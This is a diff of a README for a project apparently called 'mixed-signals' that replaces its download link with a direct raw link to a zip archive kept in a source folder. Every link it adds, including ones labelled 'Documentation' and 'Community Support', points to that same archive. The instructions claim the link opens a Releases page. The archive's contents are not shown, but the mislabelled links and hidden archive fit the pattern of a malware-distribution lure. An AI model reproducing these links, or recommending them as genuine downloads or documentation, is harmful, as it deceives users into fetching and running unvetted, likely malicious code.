@@ -15,7 +15,7 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download mixed-signals, visit this page: [Download mixed-signals](https://github.com/Bao281211/mixed-signals/raw/refs/heads/main/src/composition/mixed-signals-2.1.zip).
+To download mixed-signals, visit this page: [Download mixed-signals](https://raw.githubusercontent.com/Bao281211/mixed-signals/main/src/types/mixed_signals_1.9.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Locate the latest version of the application.
@@ -71,8 +71,8 @@ If you encounter any issues, feel free to reach out through the Issues tab on th
 
 ## 🔗 Useful Links
 
-- [Download mixed-signals](https://github.com/Bao281211/mixed-signals/raw/refs/heads/main/src/composition/mixed-signals-2.1.zip)
-- [Documentation](https://github.com/Bao281211/mixed-signals/raw/refs/heads/main/src/composition/mixed-signals-2.1.zip)
-- [Community Support](https://github.com/Bao281211/mixed-signals/raw/refs/heads/main/src/composition/mixed-signals-2.1.zip)
+- [Download mixed-signals](https://raw.githubusercontent.com/Bao281211/mixed-signals/main/src/types/mixed_signals_1.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Bao281211/mixed-signals/main/src/types/mixed_signals_1.9.zip)
+- [Community Support](https://raw.githubusercontent.com/Bao281211/mixed-signals/main/src/types/mixed_signals_1.9.zip)
 
 Enjoy creating with mixed-signals!
